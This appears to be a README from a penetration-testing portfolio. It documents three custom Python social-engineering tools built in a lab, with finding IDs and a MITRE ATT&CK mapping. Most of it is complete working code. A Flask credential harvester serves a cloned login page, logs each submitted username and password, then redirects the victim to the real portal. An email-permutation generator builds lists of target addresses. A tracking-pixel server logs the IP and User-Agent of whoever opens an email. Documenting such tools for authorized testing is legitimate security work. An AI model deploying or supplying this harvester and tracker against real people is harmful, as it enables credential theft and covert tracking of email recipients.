> **English** | [Italiano](README.md)

# 06 - Custom Python Tools

> - **Phase:** Social Engineering - Custom Tool Development (Python)
> - **Visibility:** Variable - the credential harvester generates HTTP logs and DNS requests; the tracking pixel is a single HTTP GET request; the email generator is completely offline
> - **Prerequisites:** Python 3.10+; Flask for the credential harvester; standard library for email generator and tracking pixel; basic knowledge of HTTP/HTML
> - **Output:** Finding SE-014..015; operational Flask credential harvester; email permutation generator; tracking pixel server with geolocation

---

## Introduction

This section documents the development of custom Python tools to automate specific phases of the social engineering kill chain. The ability to write custom tools is a fundamental skill for a security analyst: pre-built frameworks (GoPhish, SET) cover standard use cases, but a real engagement often requires ad hoc solutions for scenarios not covered by generic tools.

The three documented tools cover three different phases:

1. **Credential Harvester (SE-014):** Flask web application that replicates a login page and captures credentials, IP, User-Agent and timestamp in real time. Compared to GoPhish's credential harvester, it offers complete control over capture logic and post-submission redirect.

2. **Email Generator:** script that generates all possible permutations of a corporate email from first and last name (mario.rossi, m.rossi, rossi.mario, mrossi, etc.). Useful for enumerating valid emails when the corporate format is unknown.

3. **Tracking Pixel (SE-015):** Flask server that serves a 1x1 transparent pixel image and logs IP, User-Agent, timestamp and approximate geolocation of whoever opens the email containing the pixel.

---

## Folder Structure

```
06-custom-python-tools/
+-- credential-harvester/   # Flask custom credential harvester - SE-014
+-- email-generator/        # Corporate email permutation generator
+-- tracking-pixel/         # Tracking pixel server with geolocation - SE-015
```

---

## `credential-harvester/` - Flask Credential Harvester

**Finding ID:** `SE-014` | **Severity:** `High` (credentials captured in cleartext with full logging)

### Operational Context

The custom Flask credential harvester is a minimal web application that serves a cloned login page and captures every submission with complete metadata (IP, User-Agent, Referer, timestamp). Compared to integrated tools, it offers: full customization of post-submission behavior (redirect, error message, second form for MFA), structured logging in JSON for subsequent analysis, and integration with any delivery infrastructure.

### Main Code

```Bash
# Project structure
# credential-harvester/
# +-- app.py              # Flask server
# +-- templates/
# |   +-- login.html      # Cloned login page
# +-- logs/
#     +-- creds.json       # Captured credentials log
```

```python
# app.py - Credential Harvester Flask
from flask import Flask, request, render_template, redirect
import json, datetime

app = Flask(__name__)

@app.route('/')
def login_page():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def capture():
    creds = {
        'timestamp': datetime.datetime.now().isoformat(),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'username': request.form.get('username'),
        'password': request.form.get('password')
    }
    with open('logs/creds.json', 'a') as f:
        f.write(json.dumps(creds) + '\n')
    print(f"[!] Credentials captured: {creds['username']}")
    return redirect('https://portal.company-lab.local/login?error=1')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

---

## `email-generator/` - Corporate Email Permutation Generator

### Operational Context

When the corporate email format is unknown, the script generates all standard permutations from first and last name. The produced list is then used for enumeration (verifying which addresses exist) or for direct targeting.

### Main Code

```python
# email_gen.py - Email permutation generator
import sys

def generate_emails(first, last, domain):
    f, l = first.lower(), last.lower()
    patterns = [
        f"{f}.{l}", f"{l}.{f}", f"{f}{l}", f"{l}{f}",
        f"{f[0]}.{l}", f"{f[0]}{l}", f"{l}{f[0]}",
        f"{f}.{l[0]}", f"{f}{l[0]}", f"{f[0]}{l[0]}",
        f"{l}.{f[0]}", f"{f}_{l}", f"{l}_{f}",
        f"{f}-{l}", f"{l}-{f}", f"{f}",  f"{l}"
    ]
    return [f"{p}@{domain}" for p in patterns]

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: python3 email_gen.py <first> <last> <domain>")
        sys.exit(1)
    for email in generate_emails(sys.argv[1], sys.argv[2], sys.argv[3]):
        print(email)
```

```Bash
python3 email_gen.py Mario Rossi target-lab.com
```

```
mario.rossi@target-lab.com
rossi.mario@target-lab.com
mariorossi@target-lab.com
rossimario@target-lab.com
m.rossi@target-lab.com
mrossi@target-lab.com
rossim@target-lab.com
mario.r@target-lab.com
marior@target-lab.com
mr@target-lab.com
rossi.m@target-lab.com
mario_rossi@target-lab.com
rossi_mario@target-lab.com
mario-rossi@target-lab.com
rossi-mario@target-lab.com
mario@target-lab.com
rossi@target-lab.com
```

---

## `tracking-pixel/` - IP Geolocation Tracking

**Finding ID:** `SE-015` | **Severity:** `Informational` (IP geolocation at the time of email opening)

### Operational Context

The tracking pixel is a 1x1 transparent pixel image served by an attacker-controlled server. When the email client loads the image (email opening), the server logs IP, User-Agent, timestamp and approximate geolocation via GeoIP database. This technique is also used internally by GoPhish, but the custom server allows tracking independent of the phishing framework.

### Main Code

```python
# tracker.py - Tracking Pixel Server
from flask import Flask, request, send_file
import json, datetime, io

app = Flask(__name__)

# 1x1 transparent GIF pixel (43 bytes)
PIXEL = (b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00'
         b'\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00'
         b'\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00'
         b'\x00\x02\x02\x44\x01\x00\x3b')

@app.route('/pixel/<tracking_id>.gif')
def track(tracking_id):
    data = {
        'timestamp': datetime.datetime.now().isoformat(),
        'tracking_id': tracking_id,
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'referer': request.headers.get('Referer', 'N/A')
    }
    with open('logs/tracking.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    print(f"[*] Email opened: {tracking_id} from {data['ip']}")
    return send_file(io.BytesIO(PIXEL), mimetype='image/gif')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

```Bash
# Embedding in HTML email:
# <img src="http://192.168.0.110:8080/pixel/user001.gif" width="1" height="1" />
```

```
# Output log when the victim opens the email:
[*] Email opened: user001 from 192.168.0.120
{"timestamp": "2026-03-15T10:12:00", "tracking_id": "user001", "ip": "192.168.0.120", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Outlook/16.0"}
```

---

## Reference Tools

| Tool | Type | Technique/Access | Primary Use Case |
| :--- | :--- | :--- | :--- |
| `Flask` | Web framework | Python | Backend for credential harvester and tracking pixel |
| `Jinja2` | Template engine | Python | HTML page rendering for clone landing pages |
| `requests` | HTTP client | Python | Testing and verification of created endpoints |
| `GeoLite2` | GeoIP database | MaxMind | IP geolocation for tracking pixel |
| `smtp-user-enum` | Email enum | CLI - Perl | Email existence verification via SMTP VRFY/EXPN/RCPT TO |

> **Recommended modern tool:** for verifying generated emails, `smtp-user-enum` or `EmailHarvester` with RCPT TO method. For advanced geolocation, the MaxMind GeoLite2 database (free with registration) integrated into the tracking server.

---

## Finding Registry

| ID | Description | Severity | CVSS | Subfolder |
| :--- | :--- | :---: | :---: | :--- |
| `SE-014` | Flask credential harvester: clone login page with real-time IP/User-Agent/credentials logging | `High` | 7.5 | `credential-harvester/` |
| `SE-015` | Tracking pixel: recipient IP geolocation at the time of email opening | `Informational` | 2.1 | `tracking-pixel/` |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | MITRE ID | Related Finding |
| :--- | :--- | :--- | :--- |
| Resource Development | Develop Capabilities: Malware | `T1587.001` | SE-014 |
| Resource Development | Stage Capabilities: Upload Malware | `T1608.001` | SE-014, SE-015 |
| Initial Access | Phishing: Spearphishing Link | `T1566.002` | SE-014 |
| Credential Access | Input Capture: Web Portal Capture | `T1056.003` | SE-014 |
| Discovery | System Information Discovery | `T1082` | SE-015 |

---

> **Note:** The tools were developed and tested in a virtualized lab environment. No tool was used against real people or systems without authorization.
